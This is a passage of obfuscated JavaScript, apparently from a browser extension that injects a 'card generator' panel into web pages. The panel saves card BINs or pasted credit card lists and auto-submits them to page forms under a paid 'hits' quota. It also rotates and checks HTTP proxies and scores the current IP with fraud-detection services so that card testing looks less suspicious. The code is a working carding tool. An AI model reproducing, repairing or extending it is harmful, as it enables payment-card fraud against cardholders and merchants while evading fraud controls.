          return;
        }
        if (_0x2fa5b2.length === 0) {
          showWarning("⚠️ Please enter at least one BIN", "error");
          return;
        }
        try {
          _0x5b367d.disabled = true;
          const _0x3e15b9 = _0x5b367d.textContent;
          _0x5b367d.textContent = "💾 Saving...";
          const _0x518388 = await saveBINs(_0x2fa5b2);
          if (_0x518388 && _0x518388.success) {
            currentBinIndex = 0;
            updateBinStatus();
            updateSwitchBtnVisibility();
            showWarning("✅ " + _0x2fa5b2.length + " BIN" + (_0x2fa5b2.length > 1 ? "s" : "") + " saved.");
            setTimeout(() => {
              try {
                chrome.runtime.sendMessage({
                  type: "RELOAD_MY_BINS_POPUP"
                });
              } catch (_0x494ab8) {}
            }, 500);
          } else {
            showWarning("❌ Save failed: " + (_0x518388 && (_0x518388.message || _0x518388.error) ? _0x518388.message || _0x518388.error : "Unknown error"), "error");
          }
          _0x5b367d.textContent = _0x3e15b9;
          _0x5b367d.disabled = false;
        } catch (_0x55c9a4) {
          _0x5b367d.disabled = false;
          _0x5b367d.textContent = "💾 Save";
          showWarning("❌ Save failed: " + (_0x55c9a4 && _0x55c9a4.message ? _0x55c9a4.message : "Unknown error"), "error");
        }
      });
    }
    if (_0x2aa3a3) {
      _0x2aa3a3.addEventListener("click", () => {
        if (_0x2aa3a3.disabled && _0x2aa3a3.getAttribute("data-disabled-reason") === "daily-limit") {
          checkDailyHitLimit().then(_0x3282a => {
            if (_0x3282a.error) {
              showWarning("⚠️ " + _0x3282a.error, "error");
            } else {
              const _0x29cb38 = _0x3282a.hits_today || 0;
              const _0x52f9b3 = _0x3282a.limit || 5;
              showWarning("⚠️ Daily hit limit reached (" + _0x29cb38 + "/" + _0x52f9b3 + "). Upgrade to Pro for unlimited hits.", "error");
            }
          });
          return;
        }
        if (currentMode === "bin") {
          const _0x59edd4 = getSavedBIN();
          if (!_0x59edd4) {
            showWarning("⚠️ Please enter BIN first.");
            return;
          }
        } else {
          if (ccList.length === 0) {
            showWarning("⚠️ Please add CCs first.");
            return;
          }
          currentCCIndex = 0;
        }
        if (isAutoSubmitting) {
          stopAutoSubmit();
        } else {
          startAutoSubmit();
        }
      });
    }
    if (_0x1ae267) {
      _0x1ae267.addEventListener("click", _0x148c13 => {
        _0x148c13.stopPropagation();
        toggleMinimize();
      });
    }
    const _0x32d283 = _0x326a8c.querySelector(".panel-header");
    if (_0x32d283) {
      _0x32d283.addEventListener("click", _0x181a09 => {
        _0x181a09.stopPropagation();
      });
    }
    const _0x31b509 = document.getElementById("modeBin");
    const _0x17ab99 = document.getElementById("modeCc");
    if (_0x31b509) {
      _0x31b509.addEventListener("click", () => setMode("bin"));
    }
    if (_0x17ab99) {
      _0x17ab99.addEventListener("click", () => setMode("cc"));
    }
    const _0x339061 = document.getElementById("openCcModal");
    const _0x358276 = document.getElementById("closeCcModal");
    const _0x25a8e8 = document.getElementById("saveCcList");
    const _0x569894 = document.getElementById("clearCcList");
    const _0x229b79 = document.getElementById("ccTextarea");
    if (_0x339061) {
      _0x339061.addEventListener("click", () => {
        const _0x148a90 = document.getElementById("ccModal");
        _0x148a90.classList.remove("hidden");
        _0x148a90.offsetHeight;
        _0x148a90.classList.add("show");
        if (_0x229b79 && ccList.length > 0) {
          _0x229b79.value = ccList.join("\n");
        }
        updateCcCount();
      });
    }
    if (_0x358276) {
      _0x358276.addEventListener("click", () => {
        const _0x219b3c = document.getElementById("ccModal");
        _0x219b3c.classList.remove("show");
        setTimeout(() => {
          _0x219b3c.classList.add("hidden");
          autoRestoreAfterModal();
        }, 400);
      });
    }
    if (_0x229b79) {
      _0x229b79.addEventListener("input", updateCcCount);
    }
    if (_0x25a8e8) {
      _0x25a8e8.addEventListener("click", saveCcListFunc);
    }
    if (_0x569894) {
      _0x569894.addEventListener("click", () => {
        if (_0x229b79) {
          _0x229b79.value = "";
        }
        updateCcCount();
      });
    }
    document.querySelectorAll(".collapsible-header").forEach(_0x1706f9 => {
      _0x1706f9.addEventListener("click", function (_0x187b91) {
        _0x187b91.preventDefault();
        _0x187b91.stopPropagation();
        const _0x300172 = this.id.replace("Toggle", "Content");
        const _0x430f29 = document.getElementById(_0x300172);
        const _0x197b9f = this.querySelector(".collapse-icon");
        if (_0x430f29 && _0x197b9f) {
          const _0x387625 = _0x430f29.classList.contains("open");
          document.querySelectorAll(".collapsible-content.open").forEach(_0x4a3f9f => {
            if (_0x4a3f9f !== _0x430f29) {
              _0x4a3f9f.classList.remove("open");
              const _0x3303bc = _0x4a3f9f.previousElementSibling;
              if (_0x3303bc) {
                _0x3303bc.classList.remove("active");
                const _0x44485a = _0x3303bc.querySelector(".collapse-icon");
                if (_0x44485a) {
                  _0x44485a.classList.remove("icon-rotated");
                }
              }
            }
          });
          if (_0x387625) {
            _0x430f29.classList.remove("open");
            this.classList.remove("active");
            _0x197b9f.classList.remove("icon-rotated");
          } else {
            _0x430f29.classList.add("open");
            this.classList.add("active");
            _0x197b9f.classList.add("icon-rotated");
          }
        }
      });
    });
    const _0x56504b = document.getElementById("customNameInput");
    const _0x587d27 = document.getElementById("musicToggleBtn");
    if (_0x56504b) {
      _0x56504b.addEventListener("input", function () {
        saveCustomName(this.value.trim());
      });
    }
    const _0x84cb78 = document.getElementById("customEmailInput");
    if (_0x84cb78) {
      _0x84cb78.addEventListener("input", function () {
        saveCustomEmail(this.value.trim());
      });
    }
    const _0x5b415f = document.getElementById("countryRegionSelect");
    const _0x23c3ad = document.getElementById("countryRegionToggle");
    if (_0x5b415f) {
      const _0x17b020 = document.createElement("option");
      _0x17b020.value = "";
      _0x17b020.textContent = "Select country / region";
      _0x17b020.disabled = true;
      _0x5b415f.appendChild(_0x17b020);
      const _0x5c7c57 = document.createDocumentFragment();
      COUNTRY_CODES.forEach(function (_0x48de37) {
        const _0x28d2f9 = COUNTRY_DISPLAY_NAMES[_0x48de37] || _0x48de37;
        const _0x2c818e = document.createElement("option");
        _0x2c818e.value = _0x48de37;
        _0x2c818e.textContent = _0x28d2f9 + " (" + _0x48de37 + ")";
        _0x5c7c57.appendChild(_0x2c818e);
      });
      _0x5b415f.appendChild(_0x5c7c57);
    }
    function _0x24da3b() {
      if (_0x23c3ad) {
        _0x23c3ad.checked = countryRegionEnabled;
      }
      if (_0x5b415f) {
        _0x5b415f.disabled = !countryRegionEnabled;
        _0x5b415f.value = countryRegionCode || "US";
      }
    }
    loadCountryRegionSettings().then(function () {
      _0x24da3b();
    });
    if (_0x23c3ad) {
      _0x23c3ad.addEventListener("change", function () {
        saveCountryRegionSettings({
          enabled: this.checked,
          countryCode: countryRegionCode,
          countryName: COUNTRY_DISPLAY_NAMES[countryRegionCode] || countryRegionName
        });
        _0x24da3b();
      });
    }
    if (_0x5b415f) {
      _0x5b415f.addEventListener("change", function () {
        const _0x2caaf8 = (this.value || "").trim().toUpperCase();
        if (!_0x2caaf8) {
          return;
        }
        saveCountryRegionSettings({
          enabled: _0x23c3ad ? _0x23c3ad.checked : true,
          countryCode: _0x2caaf8,
          countryName: COUNTRY_DISPLAY_NAMES[_0x2caaf8] || _0x2caaf8
        });
        _0x24da3b();
      });
    }
    function _0x5f44fe() {
      const _0x4f9493 = document.getElementById("proxyModal");
      if (_0x4f9493) {
        _0x542ef4();
        _0x4f9493.classList.remove("hidden");
      }
    }
    function _0x542ef4() {
      const _0x6dac77 = document.getElementById("proxyModalTitle");
      const _0x110410 = document.getElementById("proxyModalBody");
      const _0x8c7097 = document.getElementById("proxyModalFooter");
      if (proxyString) {
        if (_0x6dac77) {
          _0x6dac77.textContent = "🌐 Proxy Info";
        }
        if (_0x110410) {
          _0x110410.innerHTML = "\n          <div class=\"proxy-info-display\">\n            <div class=\"proxy-info-row\">\n              <span class=\"proxy-info-label\">List:</span>\n              <span class=\"proxy-info-value\" style=\"color:#44ACFF\">" + (proxyList ? proxyList.length : 0) + " proxies " + (proxyAutoRotate ? "(Auto-Rotate ON)" : "") + "</span>\n            </div>\n            <div class=\"proxy-info-row\">\n              <span class=\"proxy-info-label\">Current:</span>\n              <span class=\"proxy-info-value proxy-masked\">" + obfuscateProxy(proxyString) + "</span>\n            </div>\n            <div class=\"proxy-info-row\">\n              <span class=\"proxy-info-label\">Status:</span>\n              <span class=\"proxy-info-value\">\n                <span class=\"success-text\">● Active</span>\n              </span>\n            </div>\n            <div class=\"proxy-info-row\">\n              <span class=\"proxy-info-label\">IP:</span>\n              <span class=\"proxy-info-value\">" + (proxyInfo.ip || "N/A") + "</span>\n            </div>\n            <div class=\"proxy-info-row\">\n              <span class=\"proxy-info-label\">Country:</span>\n              <span class=\"proxy-info-value\">" + (proxyInfo.country_name || "N/A") + (proxyInfo.country_code ? " (" + proxyInfo.country_code + ")" : "") + "</span>\n            </div>\n            <div class=\"proxy-info-row\">\n              <span class=\"proxy-info-label\">Response:</span>\n              <span class=\"proxy-info-value\">" + (proxyInfo.response_time_ms ? proxyInfo.response_time_ms + "ms" : "N/A") + "</span>\n            </div>\n          </div>\n        ";
        }
        if (_0x8c7097) {
          _0x8c7097.innerHTML = "\n          <button class=\"action-btn danger-btn\" id=\"proxyRemoveBtn\">🗑 Remove</button>\n        ";
        }
      } else {
        if (_0x6dac77) {
          _0x6dac77.textContent = "🌐 Set Proxy";
        }
        if (_0x110410) {
          _0x110410.innerHTML = "\n          <div class=\"proxy-setup-form\">\n            <div class=\"proxy-form-row\">\n              <label class=\"proxy-form-label\">HTTP Proxies (One per line)</label>\n              <textarea class=\"input-field\" id=\"proxyInput\" placeholder=\"host:port:user:pass\" rows=\"4\" style=\"resize:vertical\"></textarea>\n            </div>\n            <div class=\"setting-row\" style=\"margin-top: 10px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px;\">\n              <span class=\"setting-icon\">🔄</span>\n              <span class=\"setting-label\" style=\"flex:1\">Auto-Rotate Proxies</span>\n              <label class=\"toggle-switch\">\n                <input type=\"checkbox\" id=\"proxyAutoRotateToggle\">\n                <span class=\"toggle-slider\"></span>\n              </label>\n            </div>\n            <div class=\"proxy-format-hint\">\n              <div class=\"proxy-format-title\">Supported Formats:</div>\n              <div>• host:port:user:pass</div>\n              <div>• user:pass@host:port</div>\n              <div>• user:pass:host:port</div>\n            </div>\n          </div>\n        ";
        }
        if (_0x8c7097) {
          _0x8c7097.innerHTML = "\n          <button class=\"action-btn primary-btn\" id=\"proxySaveBtn\">💾 Save</button>\n        ";
        }
      }
      _0x4040e6();
    }
    function _0x1c74a2() {
      const _0x45aa7e = document.getElementById("proxyViewBtn");
      if (_0x45aa7e) {
        _0x45aa7e.textContent = proxyString ? "View" : "Set";
      }
    }
    function _0x528857(_0x2dae84) {
      _0x2dae84 = parseInt(_0x2dae84, 10);
      if (isNaN(_0x2dae84)) {
        _0x2dae84 = 0;
      }
      if (_0x2dae84 < 0) {
        return 0;
      }
      if (_0x2dae84 > 100) {
        return 100;
      }
      return _0x2dae84;
    }
    function _0x2caf79(_0x54dbc3) {
      _0x54dbc3 = _0x528857(_0x54dbc3);
      if (_0x54dbc3 >= 75) {
        return "very-high";
      }
      if (_0x54dbc3 >= 50) {
        return "high";
      }
      if (_0x54dbc3 >= 25) {
        return "medium";
      }
      return "low";
    }
    function _0x2bc0e6(_0x392f2a) {
      const _0x5f4019 = _0x2caf79(_0x392f2a);
      if (_0x5f4019 === "very-high") {
        return "VERY HIGH";
      }
      if (_0x5f4019 === "high") {
        return "HIGH";
      }
      if (_0x5f4019 === "medium") {
        return "MEDIUM";
      }
      return "LOW";
    }
    function _0x54c4d9() {
      const _0x353a07 = document.getElementById("ipFraudIp");
      const _0xd4379f = document.getElementById("ipFraudBadge");
      const _0x2f7168 = document.getElementById("ipFraudScoreText");
      const _0x28c691 = document.getElementById("ipFraudSource");
      const _0x3093a1 = document.getElementById("ipFraudCountry");
      const _0x48a274 = document.getElementById("ipFraudState");
      const _0x3a7dc6 = document.getElementById("ipFraudCity");
      const _0x30603f = document.getElementById("ipFraudIsp");
      const _0x181572 = document.getElementById("ipFraudFoot");
      if (_0x353a07) {
        _0x353a07.textContent = "Loading...";
        _0x353a07.classList.add("blurred");
      }
      if (_0xd4379f) {
        _0xd4379f.textContent = "...";
        _0xd4379f.className = "ipfraud-badge low";
      }
      if (_0x2f7168) {
        _0x2f7168.textContent = "Score: --/100";
      }
      if (_0x28c691) {
        _0x28c691.textContent = "Checking current IP...";
      }
      if (_0x3093a1) {
        _0x3093a1.textContent = "--";
      }
      if (_0x48a274) {
        _0x48a274.textContent = "--";
      }
      if (_0x3a7dc6) {
        _0x3a7dc6.textContent = "--";
      }
      if (_0x30603f) {
        _0x30603f.textContent = "--";
      }
      if (_0x181572) {
        _0x181572.textContent = "Provider: IPQualityScore. A default key is built in. Use CFG only if you want to replace it. ProxyCheck.io is used only as fallback.";
      }
      _0xcd504b(0, "low");
    }
    function _0xcd504b(_0x3397ea, _0x10d30c) {
      const _0x3032da = document.getElementById("ipFraudScorebar");
      if (!_0x3032da) {
        return;
      }
      const _0x2074aa = _0x3032da.querySelectorAll("span");
      const _0x3f4622 = Math.max(1, Math.ceil(_0x528857(_0x3397ea) / 10));
      _0x2074aa.forEach((_0x7bf4a6, _0x39dff) => {
        _0x7bf4a6.className = _0x39dff < _0x3f4622 ? "active " + _0x10d30c : "";
      });
    }
    function _0x410a1a(_0x1ff16f) {
      const _0x1a67b4 = _0x528857(_0x1ff16f.score);
      const _0x47ef31 = _0x2caf79(_0x1a67b4);
      const _0x30c839 = document.getElementById("ipFraudIp");
      const _0x17051d = document.getElementById("ipFraudBadge");
      const _0x45dbc4 = document.getElementById("ipFraudScoreText");
      const _0x12ce0b = document.getElementById("ipFraudSource");
      const _0x516106 = document.getElementById("ipFraudCountry");
      const _0x5a1e6b = document.getElementById("ipFraudState");
      const _0x723888 = document.getElementById("ipFraudCity");
      const _0x21e0c3 = document.getElementById("ipFraudIsp");
      const _0x196b8a = document.getElementById("ipFraudFoot");
      if (_0x30c839) {
        _0x30c839.textContent = _0x1ff16f.ip || "N/A";
      }
      if (_0x17051d) {
        _0x17051d.textContent = _0x2bc0e6(_0x1a67b4);
        _0x17051d.className = "ipfraud-badge " + _0x47ef31;
      }
      if (_0x45dbc4) {
        _0x45dbc4.textContent = "Score: " + _0x1a67b4 + "/100";
      }
      if (_0x12ce0b) {
        _0x12ce0b.textContent = "Source: " + (_0x1ff16f.source || "ipqualityscore");
      }
      if (_0x516106) {
        _0x516106.textContent = _0x1ff16f.country || "N/A";
      }
      if (_0x5a1e6b) {
        _0x5a1e6b.textContent = _0x1ff16f.state || "N/A";
      }
      if (_0x723888) {
        _0x723888.textContent = _0x1ff16f.city || "N/A";
      }
      if (_0x21e0c3) {
        _0x21e0c3.textContent = _0x1ff16f.isp || "N/A";
      }
      const _0x31e67f = [];
      if (_0x1ff16f.is_proxy) {
        _0x31e67f.push("Proxy");
      }
      if (_0x1ff16f.is_vpn) {
        _0x31e67f.push("VPN");
      }
      if (_0x1ff16f.is_tor) {
        _0x31e67f.push("Tor");
      }
      if (_0x1ff16f.is_datacenter) {
        _0x31e67f.push("Datacenter");
      }
      if (_0x1ff16f.is_abuser) {
        _0x31e67f.push("Abuser");
      }
      if (_0x196b8a) {
        _0x196b8a.textContent = _0x1ff16f.notes || (_0x31e67f.length ? "Signals: " + _0x31e67f.join(", ") : "No elevated fraud indicators were returned.");
      }
      _0xcd504b(_0x1a67b4, _0x47ef31);
    }
    function _0x4a9486(_0x5500f1) {
      const _0x4946c4 = document.getElementById("ipFraudIp");
      const _0x199e01 = document.getElementById("ipFraudBadge");
      const _0x5a5ec6 = document.getElementById("ipFraudScoreText");
      const _0x5aa34b = document.getElementById("ipFraudSource");
      const _0x98167 = document.getElementById("ipFraudFoot");
      if (_0x4946c4) {
        _0x4946c4.textContent = "Unavailable";
        _0x4946c4.classList.remove("blurred");
      }
      if (_0x199e01) {
        _0x199e01.textContent = "ERROR";
        _0x199e01.className = "ipfraud-badge error";
      }
      if (_0x5a5ec6) {
        _0x5a5ec6.textContent = "Score: --/100";
      }
      if (_0x5aa34b) {
        _0x5aa34b.textContent = "Source: request failed";
      }
      if (_0x98167) {
        _0x98167.textContent = _0x5500f1 || "Unable to check fraud score.";
      }
      _0xcd504b(0, "low");
    }
    async function _0x30c5fc() {
      _0x54c4d9();
      try {
        const _0x5d9f8 = await sendToBackground({
          type: "FETCH_REAL_IP"
        });
        if (!_0x5d9f8 || !_0x5d9f8.success || !_0x5d9f8.ip) {
          throw new Error(_0x5d9f8 && _0x5d9f8.error ? _0x5d9f8.error : "Failed to get current IP");
        }
        const _0x4c2480 = await sendToBackground({
          type: "GET_IP_FRAUD_CHECK",
          ip: _0x5d9f8.ip,
          endpoint: ipFraudApiKey || ""
        });
        if (!_0x4c2480 || !_0x4c2480.success) {
          throw new Error(_0x4c2480 && _0x4c2480.error ? _0x4c2480.error : "Fraud check failed");
        }
        const _0x52f359 = [_0x4c2480.country, _0x4c2480.state, _0x4c2480.city, _0x4c2480.isp].some(_0x2ae536 => _0x2ae536 && _0x2ae536 !== "N/A");
        if (!_0x52f359) {
          throw new Error("Fraud lookup returned empty details");
        }
        _0x410a1a(_0x4c2480);
      } catch (_0x16ff92) {
        _0x4a9486(_0x16ff92 && _0x16ff92.message ? _0x16ff92.message : "Fraud check failed");
      }
    }
    function _0xb7cbed() {
      const _0x853d45 = document.getElementById("ipFraudBtn");
      const _0x55d50f = document.getElementById("closeIpFraudModal");
      const _0x294f9f = document.getElementById("ipFraudRefreshBtn");
      const _0x16dc94 = document.getElementById("ipFraudSettingsBtn");
      const _0x2615ca = document.getElementById("ipFraudToggleBtn");
      const _0x1649c6 = document.getElementById("ipFraudModal");
      const _0x7b1453 = document.getElementById("ipFraudIp");
      if (_0x853d45) {
        _0x853d45.addEventListener("click", async _0x3655b0 => {
          _0x3655b0.preventDefault();
          _0x3655b0.stopPropagation();
          if (_0x1649c6) {
            _0x1649c6.classList.remove("hidden");
            _0x1649c6.classList.add("show");
          }
          await _0x30c5fc();
        });
      }
      if (_0x55d50f) {
        _0x55d50f.addEventListener("click", () => {
          if (_0x1649c6) {
            _0x1649c6.classList.remove("show");
            _0x1649c6.classList.add("hidden");
          }
          autoRestoreAfterModal();
        });
      }
      if (_0x294f9f) {
        _0x294f9f.addEventListener("click", () => {
          _0x30c5fc();
        });
      }
      if (_0x16dc94) {
        _0x16dc94.addEventListener("click", () => {
          const _0x5a1c3d = window.prompt("Enter your IPQualityScore API key. Leave blank to restore the built-in default key.", ipFraudApiKey || "");
          if (_0x5a1c3d === null) {
            return;
          }
          ipFraudApiKey = _0x5a1c3d.trim() || DEFAULT_IPQS_API_KEY;
          localStorage.setItem(IP_FRAUD_API_KEY, ipFraudApiKey);
          _0x30c5fc();
        });
      }
      if (_0x2615ca && _0x7b1453) {
        _0x2615ca.addEventListener("click", () => {
          _0x7b1453.classList.toggle("blurred");
          _0x2615ca.title = _0x7b1453.classList.contains("blurred") ? "Show IP" : "Hide IP";
        });
      }
    }
    function _0x4040e6() {
      const _0x540687 = document.getElementById("closeProxyModal");
      const _0x3ad2d6 = document.getElementById("proxySaveBtn");
      const _0x5d7a67 = document.getElementById("proxyRemoveBtn");
      if (_0x540687) {
        _0x540687.onclick = function () {
          const _0x5a6d29 = document.getElementById("proxyModal");
          if (_0x5a6d29) {
            _0x5a6d29.classList.remove("show");
            _0x5a6d29.classList.add("hidden");
          }
          autoRestoreAfterModal();
        };
      }
      if (_0x3ad2d6) {
        _0x3ad2d6.onclick = async function () {
          const _0x173a30 = document.getElementById("proxyInput");
          const _0x560396 = _0x173a30?.value?.trim() || "";
          if (!_0x560396) {
            showWarning("❌ Enter proxy", "error");
            return;
          }
          const _0x30f1fa = document.getElementById("proxyAutoRotateToggle");
          const _0x366ec3 = _0x30f1fa ? _0x30f1fa.checked : false;
          let _0x391606 = [...new Set(_0x560396.split("\n").map(_0x4210c9 => _0x4210c9.trim()).filter(_0x64daa6 => _0x64daa6))];
          if (_0x391606.length === 0) {
            showWarning("❌ No valid proxies", "error");
            return;
          }
          const _0x10e704 = _0x391606.filter(_0x569597 => !parseProxyFormat(_0x569597));
          if (_0x10e704.length === _0x391606.length) {
            showWarning("Invalid proxy format", "error");
            return;
          }
          if (_0x10e704.length > 0) {
            _0x391606 = _0x391606.filter(_0x112a48 => parseProxyFormat(_0x112a48));
          }
          _0x3ad2d6.disabled = true;
          _0x3ad2d6.textContent = "🔍 Checking...";
          let _0x3f1b83 = [];
          try {
            _0x3f1b83 = await checkMultipleProxies(_0x391606, (_0x475085, _0x468484) => {
              const _0x416448 = _0x475085.length > 15 ? _0x475085.substring(0, 15) + "..." : _0x475085;
              _0x3ad2d6.textContent = _0x468484 ? "✅ " + _0x416448 : "❌ " + _0x416448;
            });
          } catch (_0x136469) {
            _0x3ad2d6.disabled = false;
            _0x3ad2d6.textContent = "💾 Save";
            showWarning("❌ Connection error during check", "error");
            return;
          }
          if (_0x3f1b83.length === 0) {
            _0x3ad2d6.disabled = false;
            _0x3ad2d6.textContent = "💾 Save";
            showWarning("❌ No live proxies found", "error");
            return;
          }
          proxyList = _0x3f1b83;
          proxyAutoRotate = _0x366ec3;
          let _0x4a6e08 = _0x3f1b83[0];
          proxyInfo = {
            ip: _0x4a6e08.info.ip || "",
            response_time_ms: _0x4a6e08.info.response_time_ms || 0,
            country_name: _0x4a6e08.info.country_name || "",
            country_code: _0x4a6e08.info.country_code || "",
            ip_type: _0x4a6e08.info.ip_type || ""
          };
          _0x3ad2d6.textContent = "⏳ Applying...";
          window.postMessage({
            type: "APPLY_PROXY",
            proxy: _0x4a6e08.string
          }, "*");
          const _0x48675a = _0x15be1b => {
            if (_0x15be1b.data && _0x15be1b.data.type === "PROXY_RESULT" && _0x15be1b.data.action === "apply") {
              window.removeEventListener("message", _0x48675a);
              if (_0x15be1b.data.success) {
                proxyString = _0x4a6e08.string;
                proxyEnabled = true;
                saveProxySettings();
                _0x1c74a2();
                updateBottomIpBar(proxyInfo.ip, true);
                _0x542ef4();
                showWarning("✅ Saved " + proxyList.length + " proxies!", "success");
              } else {
                _0x3ad2d6.disabled = false;
                _0x3ad2d6.textContent = "💾 Save";
                showWarning("❌ " + (_0x15be1b.data.error || "Failed to apply proxy"), "error");
              }
            }
          };
          window.addEventListener("message", _0x48675a);
          setTimeout(() => {
            window.removeEventListener("message", _0x48675a);
            _0x3ad2d6.disabled = false;
            _0x3ad2d6.textContent = "💾 Save";
          }, 5000);
        };
      }
      if (_0x5d7a67) {
        _0x5d7a67.onclick = function () {
          _0x5d7a67.disabled = true;
          _0x5d7a67.textContent = "⏳...";
          window.postMessage({
            type: "CLEAR_PROXY"
          }, "*");
          const _0x4f54a0 = _0x2fb214 => {
            if (_0x2fb214.data && _0x2fb214.data.type === "PROXY_RESULT" && _0x2fb214.data.action === "clear") {
              window.removeEventListener("message", _0x4f54a0);
              _0x5d7a67.disabled = false;
              _0x5d7a67.textContent = "🗑 Remove";
              proxyString = "";
              proxyEnabled = false;
              proxyInfo = {
                ip: "",
                response_time_ms: 0,
                country_name: "",
                country_code: "",
                ip_type: ""
              };
              saveProxySettings();
              _0x1c74a2();
              updateBottomIpBar("", false);
              fetchRealIp();
              const _0x1a347c = document.getElementById("proxyModal");
              if (_0x1a347c) {
                _0x1a347c.classList.remove("show");
                _0x1a347c.classList.add("hidden");
              }
              const _0x335636 = document.querySelector(".card-generator-overlay");
              if (_0x335636 && isMinimized) {
                isMinimized = false;
                _0x335636.classList.remove("minimized");
                const _0xae3886 = document.getElementById("minimizeBtn");
                if (_0xae3886) {
                  _0xae3886.innerHTML = "»";
                  _0xae3886.title = "Close panel";
                }
              }
              showWarning("🗑 Proxy removed", "info");
            }
          };
          window.addEventListener("message", _0x4f54a0);
          setTimeout(() => {
            window.removeEventListener("message", _0x4f54a0);
            _0x5d7a67.disabled = false;
            _0x5d7a67.textContent = "🗑 Remove";
          }, 5000);
        };
      }
    }
    function _0x23e0ff(_0x1d342e) {
      return /^#[0-9A-Fa-f]{6}$/.test(_0x1d342e);
    }
    function _0x435533(_0x2b20) {
      if (!_0x23e0ff(_0x2b20)) {
        return;
      }
      pageBackgroundColor = _0x2b20;
      hasCustomColor = true;
      _bgProcessed = new WeakSet();
      _lastAppliedBgColor = null;
      saveBgColorSetting(bgColorEnabled, _0x2b20, true);
      const _0x2c8f57 = document.getElementById("pageBgColorInput");
      if (_0x2c8f57) {
        _0x2c8f57.value = _0x2b20;
      }
      if (bgColorEnabled) {
        applyCustomStyles();
      }
    }
    function _0x667c00() {
      const _0x30f74e = document.querySelector(".card-generator-overlay");
      if (_0x30f74e && !isMinimized) {
        isMinimized = true;
        _0x30f74e.classList.add("minimized");
        const _0x1da02b = document.getElementById("minimizeBtn");
        if (_0x1da02b) {
          _0x1da02b.innerHTML = "✦";
          _0x1da02b.title = "Open panel";
        }
      }
      const _0x1ad882 = document.getElementById("bgInfoModal");
      if (_0x1ad882) {
        _0x1ad882.classList.remove("hidden");
        _0x1ad882.classList.add("show");
      }
    }
    function _0x703850() {
      const _0x5901d8 = document.getElementById("bgColorToggle");
      if (_0x5901d8) {
        _0x5901d8.addEventListener("change", function () {
          bgColorEnabled = this.checked;
          _bgProcessed = new WeakSet();
          _lastAppliedBgColor = null;
          saveBgColorSetting(bgColorEnabled, pageBackgroundColor, hasCustomColor);
          const _0x23b9c5 = document.getElementById("colorSettingsBox");
          if (_0x23b9c5) {
            _0x23b9c5.classList.toggle("hidden", !bgColorEnabled);
          }
          if (bgColorEnabled) {
            _0x667c00();
            if (!hasCustomColor) {
              sessionRandomColor = getRandomBgColor();
            }
            applyCustomStyles();
          } else {
            document.documentElement.style.removeProperty("background");
            document.documentElement.style.removeProperty("background-color");
            document.body.style.removeProperty("background");
            document.body.style.removeProperty("background-color");
            location.reload();
          }
        });
      }
      const _0x394255 = document.getElementById("pageBgColorInput");
      if (_0x394255) {
        _0x394255.addEventListener("input", function () {
          _0x435533(this.value);
        });
      }
      const _0x5f5d8b = document.getElementById("customMusicBtn");
      const _0x525ff3 = document.getElementById("musicFileInput");
      const _0x2f0949 = document.getElementById("customMusicInfo");
      const _0x15a6e1 = document.getElementById("musicFilename");
      const _0x3fcd27 = document.getElementById("removeMusicBtn");
      const _0x586106 = document.getElementById("previewMusicBtn");
      let _0x2a5152 = null;
      let _0x7f0c = false;
      try {
        localStorage.removeItem(K.MUSIC_DATA);
      } catch (_0x1c4502) {}
      const _0x308d78 = localStorage.getItem(K.MUSIC_NAME);
      if (_0x308d78 && _0x2f0949 && _0x15a6e1) {
        _0x2f0949.classList.remove("hidden");
        _0x15a6e1.textContent = _0x308d78;
        if (_0x5f5d8b) {
          _0x5f5d8b.textContent = "Change";
        }
      }
      if (_0x586106) {
        _0x586106.addEventListener("click", () => {
          if (!localStorage.getItem(K.MUSIC_NAME)) {
            showWarning("No custom music to preview", "info");
            return;
          }
          if (_0x7f0c) {
            window.postMessage({
              type: "STOP_CUSTOM_PREVIEW"
            }, "*");
            _0x7f0c = false;
            _0x586106.textContent = "▶️ Test";
            showWarning("Preview stopped", "info");
            return;
          }
          window.postMessage({
            type: "PLAY_CUSTOM_PREVIEW"
          }, "*");
          _0x7f0c = true;
          _0x586106.textContent = "⏹️ Stop";
          showWarning("Playing...", "success");
          setTimeout(() => {
            if (_0x7f0c) {
              _0x7f0c = false;
              _0x586106.textContent = "▶️ Test";
            }
          }, 30000);
        });
      }
      if (_0x5f5d8b && _0x525ff3) {
        _0x5f5d8b.addEventListener("click", () => {
          if (_0x2a5152) {
            _0x2a5152.pause();
            _0x2a5152 = null;
            _0x7f0c = false;
            if (_0x586106) {
              _0x586106.textContent = "▶️";
            }
          }
          _0x525ff3.click();
        });
        _0x525ff3.addEventListener("change", function () {
          const _0x2640af = this.files[0];
          if (!_0x2640af) {
            return;
          }
          if (!_0x2640af.type.includes("audio/mpeg") && !_0x2640af.name.endsWith(".mp3")) {
            showWarning("Only MP3 files allowed", "error");
            return;
          }
          if (_0x2640af.size > 5242880) {
            showWarning("File too large (max 5MB)", "error");
            return;
          }
          const _0x5b19e8 = new FileReader();
          _0x5b19e8.onload = function (_0x15b4f3) {
            const _0x88e24b = _0x15b4f3.target.result;
            localStorage.setItem(K.MUSIC_NAME, _0x2640af.name);
            window.postMessage({
              type: "SAVE_CUSTOM_MUSIC",
              audioData: _0x88e24b
            }, "*");
            if (_0x2f0949) {
              _0x2f0949.classList.remove("hidden");
            }
            if (_0x15a6e1) {
              _0x15a6e1.textContent = _0x2640af.name;
            }
            if (_0x5f5d8b) {
              _0x5f5d8b.textContent = "Change";
            }
            showWarning("Custom music uploaded!", "success");
          };
          _0x5b19e8.readAsDataURL(_0x2640af);
        });
      }
      if (_0x3fcd27) {
        _0x3fcd27.addEventListener("click", () => {
          if (_0x2a5152) {
            _0x2a5152.pause();
            _0x2a5152 = null;
            _0x7f0c = false;
            if (_0x586106) {
              _0x586106.textContent = "▶️";
            }
          }
          localStorage.removeItem(K.MUSIC_NAME);
          window.postMessage({
            type: "REMOVE_CUSTOM_MUSIC"
          }, "*");
          if (_0x2f0949) {
            _0x2f0949.classList.add("hidden");
          }
          if (_0x15a6e1) {
            _0x15a6e1.textContent = "No file";
          }
          if (_0x5f5d8b) {
            _0x5f5d8b.textContent = "Upload";
          }
          showWarning("Custom music removed", "info");
        });
      }
    }
    function _0x5ba802() {}
    function _0x34ab5b() {
      const _0x2c42de = document.getElementById("musicToggleBtn");
      if (_0x2c42de) {
        _0x2c42de.addEventListener("click", _0x1dd7e9 => {
          _0x1dd7e9.preventDefault();
          _0x1dd7e9.stopPropagation();
          toggleMusic();
        });
      }
      const _0x559985 = document.getElementById("clearHistory");
      if (_0x559985) {
        _0x559985.addEventListener("click", () => {
          cardHistory = [];
          updateHistoryDisplay();
